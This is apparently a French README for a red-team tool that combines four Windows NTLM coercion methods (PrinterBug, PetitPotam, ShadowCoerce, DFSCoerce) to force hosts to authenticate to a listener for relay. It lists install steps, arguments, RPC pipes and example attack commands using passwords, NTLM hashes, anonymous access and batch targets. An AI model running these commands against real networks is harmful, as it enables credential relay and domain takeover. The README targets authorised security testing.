# PrinterBug Pro
Language: [English](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/README.md) | [中文](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_zh.md) | [Français](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_fr.md)
Outil de coercition d'authentification NTLM SMB Windows, force la cible à se connecter à votre écouteur via les protocoles RPC MS-RPRN/MS-EFSR/MS-FSRVP/MS-DFSNM pour relais NTLM, entièrement compatible avec les paramètres du printerbug.py original.
![platform](https://img.shields.io/badge/platform-Windows-blue) ![license](https://img.shields.io/badge/license-MIT-green)

## Fonctionnalités
- 100% rétrocompatible avec tous les arguments du printerbug.py original, remplacement direct
- 4 méthodes de coercition intégrées : MS-RPRN (PrinterBug classique, par défaut), MS-EFSR (PetitPotam), MS-FSRVP (ShadowCoerce), MS-DFSNM (DFSCoerce)
- Mode automatique : essaie toutes les méthodes disponibles séquentiellement
- Détection automatique de la signature SMB pour indiquer la faisabilité du relais NTLM
- Analyse de cibles en lot avec suivi de progression
- Correction de tous les bugs du script original : erreur de journalisation impacket, inversion logique `-no-ping`, gestion incorrecte des accès refusés
- Aucune dépendance supplémentaire, script à fichier unique
## Installation
```bash
git clone https://github.com/RedteamNotes/Printerbug-Pro.git
cd Printerbug-Pro
pip3 install impacket
chmod +x printerbug_pro.py
```
## Utilisation
### Syntaxe
```bash
python3 printerbug_pro.py [[domaine/]utilisateur[:motdepasse]@]<cible> <ecouteur> [options]
```
### Arguments
| Argument | Description |
|----------|-------------|
| cible | Adresse cible, format : `[[domaine/]utilisateur[:motdepasse]@]<IP/nom d'hôte>` |
| ecouteur | IP/nom d'hôte de votre écouteur pour recevoir l'authentification NTLM |
| --verbose | Activer la sortie de débogage |
| --method | Méthode de coercition : `printerbug`(par défaut), `petitpotam`, `shadowcoerce`, `dfscoerce`, `all` |
| -target-file | Fichier avec les cibles (une par ligne, les lignes commençant par `#` sont ignorées) |
| -port | Port SMB, par défaut 445 |
| -timeout | Délai de connexion en secondes, par défaut 3 |
| -no-ping | Ignorer la vérification TCP ping avant connexion |
| -hashes | Hashes NTLM pour l'authentification, format `LMHASH:NTHASH` |
| -no-pass | Ne pas demander de mot de passe, pour accès anonyme |
| -k | Utiliser l'authentification Kerberos |
| -dc-ip | Adresse IP du contrôleur de domaine |
| -target-ip | Adresse IP cible lors de l'utilisation d'un nom d'hôte |
### Exemples
```bash
# PrinterBug classique
python3 printerbug_pro.py domaine/utilisateur:MotDePasse@10.10.10.10 10.10.10.20
# Méthode PetitPotam
python3 printerbug_pro.py domaine/utilisateur:MotDePasse@10.10.10.10 10.10.10.20 --method petitpotam
# Essayer toutes les méthodes automatiquement
python3 printerbug_pro.py domaine/utilisateur:MotDePasse@10.10.10.10 10.10.10.20 --method all
# Coercition anonyme
python3 printerbug_pro.py 'DOMAINE\'@10.10.10.10 10.10.10.20 --no-pass
# Authentification par hash NTLM
python3 printerbug_pro.py domaine/utilisateur@10.10.10.10 10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# Analyse en lot depuis un fichier
python3 printerbug_pro.py ''@$placeholder 10.10.10.20 -target-file cibles.txt --no-pass --method all
```
## Méthodes supportées
| Méthode | Protocole | Pipe | Notes |
|---------|-----------|------|-------|
| PrinterBug | MS-RPRN | `\pipe\spoolss` | Bug du spouleur classique, fonctionne quand le service Spouleur d'impression est actif |
| PetitPotam | MS-EFSR | `\pipe\efsrpc` | Fonctionne sur la plupart des versions Windows même si le spouleur est désactivé |
| ShadowCoerce | MS-FSRVP | `\pipe\FssagentRpc` | Fonctionne sur les versions Server avec le service VSS activé |
| DFSCoerce | MS-DFSNM | `\pipe\netdfs` | Fonctionne sur les contrôleurs de domaine et serveurs DFS |
## Avertissement
Cet outil est réservé aux tests de sécurité autorisés et aux opérations d'équipe rouge. L'accès non autorisé à des systèmes informatiques est illégal. Les auteurs ne sont pas responsables de toute utilisation abusive ou dommage causé par ce programme.
## Crédits
- PrinterBug original par Dirk-jan Mollema (@_dirkjan)
- PetitPotam par @topotam77
- ShadowCoerce par @ShutdownRepo
- DFSCoerce par @filip_dragovic